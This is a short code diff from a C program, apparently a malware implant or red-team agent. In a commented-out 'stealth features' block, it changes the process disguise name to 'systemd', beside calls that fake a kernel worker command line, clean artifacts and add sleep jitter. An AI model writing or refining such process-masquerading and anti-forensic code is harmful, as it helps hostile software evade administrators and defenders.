@@ -22,7 +22,7 @@ int main(int argc, char *argv[]) {
     // Apply stealth features
     // Disabling stealth features since it is buggy
     /*
-     rename_process("apache3");
+     rename_process("systemd");
      change_cmdline("[kworker/u8:2]");
      clean_artifacts();
      dynamic_sleep(5, 10); // Base time: 5 seconds, Jitter: 10 seconds
